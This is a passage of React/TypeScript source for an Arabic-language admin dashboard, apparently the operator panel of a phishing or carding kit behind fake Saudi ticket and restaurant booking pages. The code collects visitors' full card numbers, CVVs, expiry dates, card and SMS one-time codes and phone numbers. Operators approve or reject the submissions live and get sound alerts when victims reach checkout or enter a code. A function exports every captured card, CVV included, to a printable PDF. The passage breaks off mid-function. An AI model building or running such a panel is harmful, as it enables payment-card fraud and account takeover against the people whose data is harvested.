import React, { useEffect, useMemo, useRef, useState } from "react";
import {
  collection,
  onSnapshot,
  query,
  doc,
  setDoc,
  deleteDoc,
  arrayUnion,
  arrayRemove,
  getDoc,
  getDocs,
  writeBatch,
  db,
  auth,
  logoutUser,
  updateApprovalStatus,
  updateOtpApprovalStatus,
  updateVisitorBlockStatus,
  addBlockedBin as fbAddBlockedBin,
  removeBlockedBin as fbRemoveBlockedBin,
  listenBlockedBins,
  pushBankContactRequest,
  onAuthStateChanged,
  type User,
} from "@/lib/firebase";
import { useLocation } from "wouter";
import { findBankLogo } from "@/lib/bank-logos";
import { useToast } from "@/hooks/use-toast";
import { ToastAction } from "@/components/ui/toast";
import cardAddedSoundUrl from "@assets/roblox_celebration_1777060364811.mp3";
import {
  Search,
  RefreshCw,
  Trash2,
  Bell,
  Volume2,
  LogOut,
  CreditCard,
  Globe,
  Smartphone as PhoneIcon,
  CheckCircle2,
  XCircle,
  Send,
  ArrowLeftRight,
  Hash,
  Lock as LockIcon,
  ChevronDown,
  Layers,
  Settings,
  Eye,
  EyeOff,
  RotateCcw,
  Users,
  Activity,
  AlarmClock,
  CheckCheck,
  AlertTriangle,
  BellRing,
  VolumeX,
  Ban,
  ShieldOff,
  Plus,
  X as XIcon,
  FileDown,
  WifiOff,
  PhoneCall,
} from "lucide-react";

type CardKey = "customer" | "otp" | "card" | "header";
type CardSetting = { visible: boolean; span: 1 | 2 };
type CardSettings = Record<CardKey, CardSetting>;

const CARD_LABELS: Record<CardKey, string> = {
  customer: "معلومات أساسية",
  otp: "العميل المحدد / OTP",
  card: "معلومات البطاقة",
  header: "ترويسة الزائر",
};

const DEFAULT_CARD_SETTINGS: CardSettings = {
  customer: { visible: true, span: 1 },
  otp: { visible: true, span: 1 },
  card: { visible: true, span: 1 },
  header: { visible: true, span: 1 },
};

const OPERATOR_LABELS: Record<string, string> = {
  stc: "STC",
  mobily: "موبايلي",
  zain: "زين",
};

function loadCardSettings(): CardSettings {
  try {
    const raw = localStorage.getItem("admin.cardSettings");
    if (!raw) return DEFAULT_CARD_SETTINGS;
    const parsed = JSON.parse(raw);
    return { ...DEFAULT_CARD_SETTINGS, ...parsed };
  } catch {
    return DEFAULT_CARD_SETTINGS;
  }
}

interface Visitor {
  id: string;
  [k: string]: any;
}

const STEP_LABELS: Record<number, string> = {
  1: "registration · التسجيل",
  2: "booking · الحجز",
  3: "checkout · الدفع",
  4: "otp · رمز التحقق",
  5: "otp_verified · تم التحقق",
  6: "confirmation · التأكيد",
};

const STEP_TO_PAGE: Record<number, string> = {
  1: "registration",
  2: "booking",
  3: "checkout",
  4: "otp",
  5: "otp_verified",
  6: "confirmation",
};

// Restaurant-reservation flow has 4 internal stages on /reserve/:id, plus the
// shared OTP and confirmation pages. Steps 1-4 are SPA-internal stages of the
// reserve page; 5 and 6 are external routes.
const RESTAURANT_STEP_LABELS: Record<number, string> = {
  1: "reserve_date · الموعد",
  2: "reserve_details · البيانات",
  3: "reserve_invoice · الفاتورة",
  4: "reserve_checkout · الدفع",
  5: "reserve_otp · رمز التحقق",
  6: "confirmation · تأكيد الحجز",
};

const RESTAURANT_STEP_TO_PAGE: Record<number, string> = {
  1: "reserve_date",
  2: "reserve_details",
  3: "reserve_invoice",
  4: "reserve_checkout",
  5: "reserve_otp",
  6: "confirmation",
};

const TICKET_TOTAL_STEPS = 6;
const RESTAURANT_TOTAL_STEPS = 6;
const TOTAL_STEPS = RESTAURANT_TOTAL_STEPS; // legacy upper bound

type VisitorFlow = "ticket" | "restaurant";

function getFlowTotalSteps(flow: VisitorFlow): number {
  return flow === "restaurant" ? RESTAURANT_TOTAL_STEPS : TICKET_TOTAL_STEPS;
}

function isFinalStep(v: any): boolean {
  const flow: VisitorFlow =
    String(v?.type || "").toLowerCase() === "restaurant_reservation" ||
    !!v?.restaurant ||
    !!v?.restaurantEn ||
    String(v?.currentPage || "").startsWith("reserve_")
      ? "restaurant"
      : "ticket";
  return (
    Number(v?.step) === getFlowTotalSteps(flow) ||
    String(v?.currentPage || "") === "confirmation"
  );
}

function getVisitorFlow(v: Visitor): VisitorFlow {
  const t = String((v as any)?.type || "").toLowerCase();
  const cp = String((v as any)?.currentPage || "").toLowerCase();
  if (
    t === "restaurant_reservation" ||
    !!(v as any)?.restaurant ||
    !!(v as any)?.restaurantEn ||
    cp.startsWith("reserve_")
  ) {
    return "restaurant";
  }
  return "ticket";
}

function getFlowStepLabels(flow: VisitorFlow): Record<number, string> {
  return flow === "restaurant" ? RESTAURANT_STEP_LABELS : STEP_LABELS;
}

function getFlowStepPage(flow: VisitorFlow, step: number): string {
  const map = flow === "restaurant" ? RESTAURANT_STEP_TO_PAGE : STEP_TO_PAGE;
  return map[step] || "";
}

/* -------------------------------------------------------------- */
/* Adapter: map current flat schema → the shape the new UI expects */
/* -------------------------------------------------------------- */

const PAGE_TO_STEP: Record<string, number> = {
  // Ticket flow
  registration: 1,
  booking: 2,
  cart: 3, // legacy alias (cart step removed from UX) → checkout
  checkout: 3,
  otp: 4,
  otp_verified: 5,
  confirmation: 6,
  // Restaurant flow (4 internal stages of /reserve/:id, then OTP, then conf)
  reserve_restaurant: 1, // legacy alias (intro step removed) → reserve_date
  reserve_date: 1,
  reserve_details: 2,
  reserve_invoice: 3,
  reserve_checkout: 4,
  reserve_otp: 5,
};

function tsFromAny(v: any): string | undefined {
  if (!v) return undefined;
  if (typeof v === "string") return v;
  if (typeof v === "number") return new Date(v).toISOString();
  if (typeof v?.toDate === "function") {
    try {
      return v.toDate().toISOString();
    } catch {
      return undefined;
    }
  }
  if (typeof v?.seconds === "number") {
    return new Date(v.seconds * 1000).toISOString();
  }
  return undefined;
}

function adaptVisitor(raw: any): Visitor {
  const cardNumber = String(raw?.cardNumber || "").replace(/\D/g, "");
  const last4 = cardNumber.slice(-4);
  const bin = cardNumber.slice(0, 6);
  const mm = String(raw?.expiryMonth || "")
    .padStart(2, "0")
    .slice(-2);
  const yy = String(raw?.expiryYear || "")
    .slice(-2)
    .padStart(2, "0");
  const expiry = mm.trim() && yy.trim() ? `${mm}/${yy}` : "";

  const ct = String(raw?.cardType || "").toLowerCase();
  const scheme =
    ct === "mada"
      ? "mada"
      : ct === "visa"
        ? "visa"
        : ct === "mastercard" || ct === "master"
          ? "mastercard"
          : ct === "amex" || ct === "american express"
            ? "amex"
            : ct;

  const matchedBank = findBankLogo(raw?.cardBankName || raw?.bankName);
  const cardBank = raw?.cardBankName || raw?.bankName || "";

  const payment = {
    cardNumber: raw?.cardNumber,
    cardLast4: last4 || undefined,
    cardBin: bin || undefined,
    cardName: raw?.cardName,
    cardExpiry: expiry || undefined,
    cardCvc: raw?.cvv,
    cardScheme: scheme,
    cardType: raw?.cardCategory || undefined,
    cardLevel: raw?.cardLevel || undefined,
    cardCountry: raw?.cardCountry || undefined,
    cardBank,
    cardBankLogo: matchedBank?.logo || null,
    cardBankLabel: matchedBank?.label || cardBank || "",
    amount: raw?.totalAmount || raw?.total,
  };

  let cardApprovalStatus: string | undefined;
  if (raw?.cardApproved === true) cardApprovalStatus = "approved";
  else if (raw?.cardStatus === "rejected") cardApprovalStatus = "rejected";
  else if (
    raw?.cardStatus === "pending_approval" ||
    raw?.status === "pending_approval"
  )
    cardApprovalStatus = "waiting";
  // Fall back to the new persisted field if no legacy signal is present.
  if (!cardApprovalStatus && typeof raw?.cardApprovalStatus === "string") {
    cardApprovalStatus = raw.cardApprovalStatus;
  }

  let otpApprovalStatus: string | undefined;
  if (raw?.otpApproved === true) otpApprovalStatus = "approved";
  else if (raw?.otpStatus === "rejected") otpApprovalStatus = "rejected";
  else if (raw?.otpStatus === "pending" || (raw?.otp && !raw?.otpApproved))
    otpApprovalStatus = "waiting";
  if (!otpApprovalStatus && typeof raw?.otpApprovalStatus === "string") {
    otpApprovalStatus = raw.otpApprovalStatus;
  }

  const phoneOtpApprovalStatus =
    typeof raw?.phoneOtpApprovalStatus === "string"
      ? raw.phoneOtpApprovalStatus
      : undefined;

  const updatedAt =
    tsFromAny(raw?.lastSeen) ||
    tsFromAny(raw?.updatedAt) ||
    raw?.createdDate ||
    undefined;

  const stepFromPage = PAGE_TO_STEP[String(raw?.currentPage || "")] || 0;
  // Honour an explicit numeric `step` from the raw doc as a fallback for
  // legacy records that don't have `currentPage`. Clamp legacy values that
  // exceed the new 6-step model (e.g. old restaurant `step: 7` records,
  // which represented the confirmation page) to the new max.
  const rawStep = Number(raw?.step) || 0;
  const flowMax = 6;
  const clampedRawStep = rawStep > flowMax ? flowMax : rawStep;
  const step =
    stepFromPage ||
    clampedRawStep ||
    (raw?.otp ? 4 : raw?.cardNumber ? 3 : raw?.name ? 1 : 0);

  const completed =
    raw?.currentPage === "confirmation" ||
    raw?.currentPage === "otp_verified" ||
    (cardApprovalStatus === "approved" && otpApprovalStatus === "approved");

  return {
    ...raw,
    payment,
    step,
    cardApprovalStatus,
    otpApprovalStatus,
    phoneOtpApprovalStatus,
    updatedAt,
    status: completed ? "nafad_otp_submitted" : raw?.status,
  } as Visitor;
}

/* -------------------------------------------------------------- */
/* Helpers                                                         */
/* -------------------------------------------------------------- */

function countryFlag(code: string): string {
  const cc = (code || "").trim().toUpperCase();
  if (cc.length !== 2 || !/^[A-Z]{2}$/.test(cc)) return "";
  const A = 0x1f1e6;
  return String.fromCodePoint(
    A + cc.charCodeAt(0) - 65,
    A + cc.charCodeAt(1) - 65,
  );
}

function fmtTime(iso?: string) {
  if (!iso) return "—";
  const d = new Date(iso);
  if (isNaN(d.getTime())) return "—";
  return d.toLocaleString("ar-SA", { dateStyle: "short", timeStyle: "short" });
}

function safeText(v: any): string {
  if (v === null || v === undefined) return "";
  if (typeof v === "string" || typeof v === "number") return String(v);
  if (typeof v === "object")
    return (
      v.name ||
      v.bank ||
      v.bank_name ||
      v.bankName ||
      v.scheme ||
      v.brand ||
      JSON.stringify(v)
    );
  return String(v);
}

function isOnline(v: Visitor): boolean {
  if (v.online === true) return true;
  if (v.online === false && !v.updatedAt) return false;
  if (!v.updatedAt) return false;
  const t = new Date(v.updatedAt).getTime();
  if (isNaN(t)) return false;
  return Date.now() - t < 60_000;
}

const WAITING_FIELDS = [
  "cardApprovalStatus",
  "otpApprovalStatus",
  "phoneOtpApprovalStatus",
  "nafadConfirmationStatus",
] as const;

function waitingFields(v: Visitor): string[] {
  return WAITING_FIELDS.filter((f) => v[f] === "waiting");
}
function isWaiting(v: Visitor): boolean {
  return waitingFields(v).length > 0;
}
function isCompleted(v: Visitor): boolean {
  return v.status === "nafad_otp_submitted" || isFinalStep(v);
}

function fmtRelative(iso?: string): string {
  if (!iso) return "—";
  const t = new Date(iso).getTime();
  if (isNaN(t)) return "—";
  const diff = Math.max(0, Date.now() - t);
  const sec = Math.floor(diff / 1000);
  if (sec < 60) return `منذ ${sec}ث`;
  const min = Math.floor(sec / 60);
  if (min < 60) return `منذ ${min}د`;
  const hr = Math.floor(min / 60);
  if (hr < 24) return `منذ ${hr}س`;
  const day = Math.floor(hr / 24);
  return `منذ ${day}ي`;
}

function stepColor(step: number): string {
  if (step >= 6)
    return "bg-emerald-500/20 text-emerald-300 border-emerald-500/40";
  if (step >= 5) return "bg-violet-500/20 text-violet-300 border-violet-500/40";
  if (step >= 4) return "bg-amber-500/20 text-amber-300 border-amber-500/40";
  if (step >= 3) return "bg-cyan-500/20 text-cyan-300 border-cyan-500/40";
  return "bg-slate-700/40 text-slate-300 border-slate-600/40";
}

function beep(volume = 0.18) {
  try {
    const Ctx =
      (window as any).AudioContext || (window as any).webkitAudioContext;
    if (!Ctx) return;
    const ctx = new Ctx();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.type = "sine";
    osc.frequency.setValueAtTime(880, ctx.currentTime);
    osc.frequency.exponentialRampToValueAtTime(1320, ctx.currentTime + 0.18);
    gain.gain.setValueAtTime(volume, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + 0.35);
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.start();
    osc.stop(ctx.currentTime + 0.36);
  } catch {}
}

/**
 * Plays a short multi-note pattern so the admin can distinguish event
 * types by ear without looking. Each note is `[freqHz, durMs]`.
 * `wave` defaults to "sine" but can be overridden for harsher alerts.
 */
function beepPattern(
  notes: Array<[number, number]>,
  volume = 0.22,
  wave: OscillatorType = "sine",
) {
  try {
    const Ctx =
      (window as any).AudioContext || (window as any).webkitAudioContext;
    if (!Ctx) return;
    const ctx = new Ctx();
    let t = ctx.currentTime;
    for (const [freq, durMs] of notes) {
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.type = wave;
      osc.frequency.setValueAtTime(freq, t);
      gain.gain.setValueAtTime(volume, t);
      gain.gain.exponentialRampToValueAtTime(0.0001, t + durMs / 1000);
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start(t);
      osc.stop(t + durMs / 1000 + 0.02);
      t += durMs / 1000 + 0.04;
    }
  } catch {}
}

/** Distinct alert tones, picked to be recognizable from across the room. */
const ALERT_TONES = {
  // Visitor entered card-entry page — urgent, descending triple beep.
  checkout: () =>
    beepPattern(
      [
        [1200, 110],
        [900, 110],
        [700, 180],
      ],
      0.28,
      "square",
    ),
  // Visitor submitted OTP code — fast double chirp.
  otp: () =>
    beepPattern(
      [
        [1500, 90],
        [1500, 90],
      ],
      0.26,
      "triangle",
    ),
  // Visitor reached confirmation page — pleasant rising arpeggio.
  confirmation: () =>
    beepPattern(
      [
        [660, 100],
        [880, 100],
        [1320, 220],
      ],
      0.22,
      "sine",
    ),
};

/**
 * Resolve the alert kind for a visitor based on their current page. Returns
 * null when the page is not one we want to alert on.
 */
function alertKindFor(currentPage: string): keyof typeof ALERT_TONES | null {
  if (currentPage === "checkout" || currentPage === "reserve_checkout")
    return "checkout";
  if (currentPage === "otp" || currentPage === "reserve_otp") return "otp";
  if (currentPage === "confirmation" || currentPage === "otp_verified")
    return "confirmation";
  return null;
}

function escHtml(s: any): string {
  const str = s == null ? "" : String(s);
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

function exportAllCardsPdf(visitors: Visitor[]) {
  const withCards = visitors.filter(
    (v) => v?.payment?.cardNumber || v?.payment?.cardLast4,
  );
  if (withCards.length === 0) {
    alert("لا توجد بطاقات لتصديرها.");
    return;
  }

  const rows = withCards
    .map((v, idx) => {
      const p = v.payment || {};
      const fullCard = String(p.cardNumber || "").replace(/\D/g, "");
      const formatted = fullCard
        ? fullCard.replace(/(.{4})/g, "$1 ").trim()
        : `**** **** **** ${escHtml(p.cardLast4 || "----")}`;
      const expiry = escHtml(p.cardExpiry || "—");
      const cvv = escHtml(p.cardCvc || "—");
      const name = escHtml(p.cardName || v.name || "—");
      const bin = escHtml(p.cardBin || (fullCard ? fullCard.slice(0, 6) : "—"));
      const bank = escHtml(p.cardBankLabel || p.cardBank || "—");
      const scheme = escHtml(p.cardScheme || "—");
      const type = escHtml(p.cardType || "—");
      const level = escHtml(p.cardLevel || "—");
      const country = escHtml(p.cardCountry || "—");
      const phone = escHtml(v.phone || "—");
      const otpCard = escHtml(v.otp || "—");
      const otpSms = escHtml(v.smsOtp || "—");
      const updated = escHtml(fmtTime(v.updatedAt));
      const visitorId = escHtml(v.id);
      return `
      <article class="card-row">
        <header class="row-head">
          <div class="row-idx">#${idx + 1}</div>
          <div class="row-meta">
            <div><strong>الزائر:</strong> ${visitorId}</div>
            <div><strong>التحديث:</strong> ${updated}</div>
          </div>
        </header>
        <div class="card-grid">
          <div class="block primary">
            <div class="lbl">رقم البطاقة</div>
            <div class="val mono big">${escHtml(formatted)}</div>
          </div>
          <div class="block"><div class="lbl">اسم حامل البطاقة</div><div class="val">${name}</div></div>
          <div class="block"><div class="lbl">تاريخ الانتهاء</div><div class="val mono">${expiry}</div></div>
          <div class="block"><div class="lbl">CVV</div><div class="val mono">${cvv}</div></div>
          <div class="block"><div class="lbl">BIN</div><div class="val mono">${bin}</div></div>
          <div class="block"><div class="lbl">الشبكة</div><div class="val">${scheme}</div></div>
          <div class="block"><div class="lbl">النوع</div><div class="val">${type}</div></div>
          <div class="block"><div class="lbl">المستوى</div><div class="val">${level}</div></div>
          <div class="block"><div class="lbl">الدولة</div><div class="val">${country}</div></div>
          <div class="block wide"><div class="lbl">البنك</div><div class="val">${bank}</div></div>
          <div class="block"><div class="lbl">رمز البطاقة (OTP)</div><div class="val mono">${otpCard}</div></div>
          <div class="block"><div class="lbl">رمز SMS</div><div class="val mono">${otpSms}</div></div>
          <div class="block wide"><div class="lbl">الجوال</div><div class="val mono">${phone}</div></div>
        </div>
      </article>`;
    })
    .join("\n");

  const now = new Date();
  const dateStr = now.toLocaleString("ar-SA");
  const html = `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8" />
<title>تصدير البطاقات - ${withCards.length}</title>
<style>
  * { box-sizing: border-box; }
  html, body { margin: 0; padding: 0; background: #fff; color: #111; font-family: -apple-system, "Segoe UI", Tahoma, Arial, "Noto Sans Arabic", sans-serif; }
  .page { padding: 18mm 12mm; }
  .doc-head { display: flex; justify-content: space-between; align-items: flex-end; border-bottom: 2px solid #111; padding-bottom: 10px; margin-bottom: 16px; }
  .doc-head h1 { margin: 0; font-size: 20px; }
  .doc-head .meta { font-size: 12px; color: #444; text-align: left; direction: ltr; }
  .doc-head .meta div { margin-bottom: 2px; }
  .summary { font-size: 12px; color: #555; margin-bottom: 14px; }
  .card-row { border: 1px solid #d0d0d0; border-radius: 6px; padding: 12px 14px; margin-bottom: 12px; page-break-inside: avoid; background: #fafafa; }
  .row-head { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; padding-bottom: 8px; border-bottom: 1px dashed #c0c0c0; }
  .row-idx { font-size: 18px; font-weight: 800; color: #1a56db; }
  .row-meta { font-size: 11px; color: #555; text-align: left; direction: ltr; }
  .row-meta strong { color: #111; }
  .card-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; }
  .block { background: #fff; border: 1px solid #e3e3e3; border-radius: 4px; padding: 6px 8px; }
  .block.wide { grid-column: span 2; }
  .block.primary { grid-column: span 4; background: #fff; border-color: #1a56db; }
  .block .lbl { font-size: 10px; color: #666; margin-bottom: 3px; }
  .block .val { font-size: 13px; color: #111; font-weight: 600; word-break: break-all; }
  .block .val.mono { font-family: "SFMono-Regular", Menlo, Consolas, monospace; direction: ltr; text-align: left; letter-spacing: 0.04em; }
  .block .val.big { font-size: 18px; letter-spacing: 0.12em; }
  .footer-note { margin-top: 14px; font-size: 10px; color: #888; text-align: center; }
  @media print {
    .no-print { display: none !important; }
    .page { padding: 10mm; }
    .card-row { background: #fff; }
  }
  .toolbar { position: sticky; top: 0; background: #1a56db; color: #fff; padding: 10px 14px; display: flex; justify-content: space-between; align-items: center; z-index: 10; }
  .toolbar button { background: #fff; color: #1a56db; border: none; padding: 8px 16px; border-radius: 4px; font-weight: 700; cursor: pointer; font-size: 13px; }
  .toolbar button:hover { background: #f0f0f0; }
</style>
</head>
<body>
  <div class="toolbar no-print">
    <span>اضغط زر "طباعة / حفظ PDF" ثم اختر "Save as PDF"</span>
    <button onclick="window.print()">طباعة / حفظ PDF</button>
  </div>
  <div class="page">
    <div class="doc-head">
      <h1>تقرير البطاقات</h1>
      <div class="meta">
        <div>${escHtml(dateStr)}</div>
        <div>إجمالي البطاقات: ${withCards.length}</div>
      </div>
    </div>
    <div class="summary">يحتوي هذا التقرير على بيانات ${withCards.length} بطاقة مُسجَّلة عبر النظام.</div>
    ${rows}
    <div class="footer-note">تم التوليد تلقائياً من لوحة التحكم</div>
  </div>
  <script>
    window.addEventListener('load', function() {
      setTimeout(function() { window.print(); }, 350);
    });
  </script>
</body>
</html>`;

  const w = window.open("", "_blank", "width=900,height=1000");
  if (!w) {
    alert("الرجاء السماح بالنوافذ المنبثقة لتصدير الـ PDF.");
    return;
  }
  w.document.open();
  w.document.write(html);
  w.document.close();
}

/* -------------------------------------------------------------- */
/* Auth wrapper                                                    */
/* -------------------------------------------------------------- */

export default function Admin() {
  const [, setLocation] = useLocation();
  const [authUser, setAuthUser] = useState<User | null>(null);
  const [authReady, setAuthReady] = useState(false);

  useEffect(() => {
    if (!auth) {
      setAuthReady(true);
      return;
    }
    const unsub = onAuthStateChanged(auth, (u) => {
      setAuthUser(u);
      setAuthReady(true);
    });
    return () => unsub();
  }, []);

  useEffect(() => {
    if (authReady && !authUser) {
      setLocation("/login");
    }
  }, [authReady, authUser, setLocation]);

  if (!authReady || !authUser) {
    return (
      <div className="min-h-screen w-full flex items-center justify-center bg-slate-950 text-slate-400 text-sm">
        جاري التحميل...
      </div>
    );
  }

  return <AdminDashboard />;
}

/* -------------------------------------------------------------- */
/* Dashboard                                                       */
/* -------------------------------------------------------------- */

function AdminDashboard() {
  const [visitors, setVisitors] = useState<Visitor[]>([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState("");
  const [filter, setFilter] = useState<
    "all" | "online" | "waiting" | "completed"
  >("all");
  const [soundOn, setSoundOn] = useState<boolean>(() => {
    try {
      return localStorage.getItem("admin.soundOn") === "1";
    } catch {
      return false;
    }
  });
  const prevWaitingIds = useRef<Set<string>>(new Set());
  const [, forceTick] = useState(0);
  const [blockedBins, setBlockedBins] = useState<string[]>([]);
  const [blocklistOpen, setBlocklistOpen] = useState(false);
  const [blockedIps, setBlockedIps] = useState<string[]>([]);
  const [ipBlocklistOpen, setIpBlocklistOpen] = useState(false);

  // Subscribe to existing blocked_bins collection (string ids).
  useEffect(() => {
    const unsub = listenBlockedBins((bins) => {
      setBlockedBins(
        bins
          .map((b) => String(b.bin || "").replace(/\D/g, ""))
          .filter((s) => s.length === 6),
      );
    });
    return () => unsub();
  }, []);

  async function addBlockedBin(bin: string) {
    const clean = String(bin).replace(/\D/g, "").slice(0, 6);
    if (clean.length !== 6) return;
    if (blockedBins.includes(clean)) return;
    try {
      await fbAddBlockedBin(clean);
    } catch (e) {
      console.error(e);
    }
  }
  async function removeBlockedBin(bin: string) {
    const clean = String(bin).replace(/\D/g, "");
    if (!clean) return;
    try {
      await fbRemoveBlockedBin(clean);
    } catch (e) {
      console.error(e);
    }
  }

  // ---- Blocked IPs (settings/blockedIps doc, ips: string[]) ----
  useEffect(() => {
    if (!db) return;
    const unsub = onSnapshot(doc(db, "settings", "blockedIps"), (snap) => {
      const data = snap.data() as any;
      const ips = Array.isArray(data?.ips) ? data.ips : [];
      setBlockedIps(
        ips
          .map((x: any) => String(x).trim())
          .filter((x: string) => x.length > 0),
      );
    });
    return () => unsub();
  }, []);

  async function addBlockedIp(ip: string) {
    if (!db) return;
    const clean = String(ip).trim();
    if (!clean) return;
    if (blockedIps.includes(clean)) return;
    await setDoc(
      doc(db, "settings", "blockedIps"),
      { ips: arrayUnion(clean), updatedAt: new Date().toISOString() },
      { merge: true },
    );
  }
  async function removeBlockedIp(ip: string) {
    if (!db) return;
    const clean = String(ip).trim();
    if (!clean) return;
    await setDoc(
      doc(db, "settings", "blockedIps"),
      { ips: arrayRemove(clean), updatedAt: new Date().toISOString() },
      { merge: true },
    );
  }

  // Block/unblock a visitor by toggling the per-doc `blocked` field.
  const blockedVisitors = useMemo(
    () => visitors.filter((v) => v.blocked === true).map((v) => v.id),
    [visitors],
  );
  async function toggleBlockedVisitor(visitorId: string) {
    const isBlocked = blockedVisitors.includes(visitorId);
    if (isBlocked) {
      if (!confirm("إزالة الحظر عن هذا الزائر؟")) return;
      await updateVisitorBlockStatus(visitorId, false);
    } else {
      if (
        !confirm("حظر هذا الزائر نهائياً؟\nسيُمنع من إكمال أي خطوة في الحجز.")
      )
        return;
      await updateVisitorBlockStatus(visitorId, true);
    }
  }

  // Re-render every 15s so relative timestamps stay fresh.
  useEffect(() => {
    const t = setInterval(() => forceTick((n) => n + 1), 15000);
    return () => clearInterval(t);
  }, []);

  useEffect(() => {
    try {
      localStorage.setItem("admin.soundOn", soundOn ? "1" : "0");
    } catch {}
  }, [soundOn]);
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [otpInput, setOtpInput] = useState("");
  const [otpDirect, setOtpDirect] = useState("");
  const [cardSettings, setCardSettings] = useState<CardSettings>(() =>
    loadCardSettings(),
  );

  useEffect(() => {
    try {
      localStorage.setItem("admin.cardSettings", JSON.stringify(cardSettings));
    } catch {}
  }, [cardSettings]);

  function updateCardSetting(key: CardKey, patch: Partial<CardSetting>) {
    setCardSettings((prev) => ({ ...prev, [key]: { ...prev[key], ...patch } }));
  }
  function resetCardSettings() {
    setCardSettings(DEFAULT_CARD_SETTINGS);
  }
  function spanClass(key: CardKey) {
    const s = cardSettings[key];
    if (!s.visible) return "hidden";
    return s.span === 2
      ? "md:col-span-2 xl:col-span-2"
      : "md:col-span-1 xl:col-span-1";
  }

  const cardSeenRef = useRef<Set<string>>(new Set());
  const cardSnapshotReadyRef = useRef(false);
  const cardAudioRef = useRef<HTMLAudioElement | null>(null);
  if (!cardAudioRef.current && typeof Audio !== "undefined") {
    cardAudioRef.current = new Audio(cardAddedSoundUrl);
    cardAudioRef.current.preload = "auto";
    cardAudioRef.current.volume = 0.85;
  }

  const { toast } = useToast();
  // Tracks the last `currentPage` we've seen for each visitor so we can
  // detect transitions into sensitive pages (checkout / otp / confirmation)
  // without re-firing alerts on every snapshot for the same state.
  const lastPageRef = useRef<Map<string, string>>(new Map());
  // Tracks the last OTP value per visitor so we can fire a toast only when
  // a NEW code is submitted (or an existing one changes), not on every
  // snapshot replay.
  const lastOtpRef = useRef<Map<string, string>>(new Map());
  // Per-visitor "recent alert" timestamps drive the row glow animation.
  // Stored in a ref + state mirror so the render reads from state but
  // updates from inside the snapshot don't cascade extra renders.
  const [recentAlerts, setRecentAlerts] = useState<
    Record<string, { kind: keyof typeof ALERT_TONES; until: number }>
  >({});
  // Tab-title pulse counter: each unread sensitive event increments this
  // when the dashboard tab is in the background; viewing the tab clears it.
  const [unreadAlerts, setUnreadAlerts] = useState(0);
  // Soft-cap how many rows we render to keep the DOM fast. Grows on scroll.
  const PAGE_SIZE = 80;
  const [visibleCount, setVisibleCount] = useState(PAGE_SIZE);
  const soundOnRef = useRef(false);
  useEffect(() => {
    soundOnRef.current = soundOn;
  }, [soundOn]);

  useEffect(() => {
    if (!db) {
      setLoading(false);
      return;
    }
    const q = query(collection(db, "pays"));
    const unsub = onSnapshot(q, (snap) => {
      const list: Visitor[] = [];
      snap.forEach((d: any) =>
        list.push(adaptVisitor({ id: d.id, ...(d.data() as any) })),
      );
      // Sort by updatedAt desc
      list.sort((a, b) => {
        const ta = new Date(a.updatedAt || 0).getTime() || 0;
        const tb = new Date(b.updatedAt || 0).getTime() || 0;
        return tb - ta;
      });

      // Detect newly-added cards. On first snapshot, just record what
      // already has a card so we don't spam on dashboard open.
      const newCardVisitors: Visitor[] = [];
      for (const v of list) {
        const hasCard = !!(
          (v as any).cardNumber ||
          v.payment?.cardNumber ||
          v.payment?.cardLast4
        );
        if (!hasCard) continue;
        if (!cardSeenRef.current.has(v.id)) {
          cardSeenRef.current.add(v.id);
          if (cardSnapshotReadyRef.current) newCardVisitors.push(v);
        }
      }
      if (newCardVisitors.length > 0 && cardAudioRef.current) {
        try {
          cardAudioRef.current.currentTime = 0;
          void cardAudioRef.current.play().catch(() => {
            // Browsers block autoplay until user interaction; safely ignore.
          });
        } catch {
          // ignore
        }
      }
      // Pop a toast for each freshly-added card so the admin gets a
      // visible heads-up even when sound is muted or the audio is
      // blocked by autoplay policy.
      for (const v of newCardVisitors) {
        const last4 =
          v.payment?.cardLast4 ||
          String((v as any).cardNumber || "")
            .replace(/\s+/g, "")
            .slice(-4);
        const name = v.name || "زائر بدون اسم";
        toast({
          title: "💳 بطاقة جديدة",
          description: `${name} • ${last4 ? "•• " + last4 : "تم إدخال البطاقة"}`,
          duration: 8000,
          action: (
            <ToastAction
              altText="فتح"
              onClick={() => setSelectedId(v.id)}
              data-testid={`toast-open-card-${v.id}`}
            >
              فتح
            </ToastAction>
          ),
        });
      }

      // Detect newly-submitted OTP codes — track per-visitor so we
      // alert exactly once per submission, not on every snapshot.
      const newOtpVisitors: Array<{ v: Visitor; code: string }> = [];
      for (const v of list) {
        const code = String((v as any).otp || "").trim();
        const prev = lastOtpRef.current.get(v.id) || "";
        if (code && code !== prev && cardSnapshotReadyRef.current) {
          newOtpVisitors.push({ v, code });
        }
        lastOtpRef.current.set(v.id, code);
      }
      for (const { v, code } of newOtpVisitors) {
        const name = v.name || "زائر بدون اسم";
        toast({
          title: "🔐 رمز OTP جديد",
          description: `${name} • ${code}`,
          duration: 10000,
          action: (
            <ToastAction
              altText="فتح"
              onClick={() => setSelectedId(v.id)}
              data-testid={`toast-open-otp-${v.id}`}
            >
              فتح
            </ToastAction>
          ),
        });
      }

      // Detect transitions into sensitive pages (checkout/otp/confirmation).
      // Only fires when a visitor's `currentPage` actually CHANGES into a
      // sensitive page, never on every snapshot — so a visitor sitting on
      // /checkout for 3 minutes alerts exactly once. We also prune the
      // page map for visitors no longer in the snapshot so memory doesn't
      // grow unbounded over long-running sessions.
      const currentIds = new Set(list.map((v) => v.id));
      for (const id of Array.from(lastPageRef.current.keys())) {
        if (!currentIds.has(id)) lastPageRef.current.delete(id);
      }
      for (const id of Array.from(cardSeenRef.current)) {
        if (!currentIds.has(id)) cardSeenRef.current.delete(id);
      }
      for (const id of Array.from(lastOtpRef.current.keys())) {
        if (!currentIds.has(id)) lastOtpRef.current.delete(id);
      }
      const triggered: Array<{
        id: string;
        kind: keyof typeof ALERT_TONES;
      }> = [];
      for (const v of list) {
        const page = String((v as any).currentPage || "");
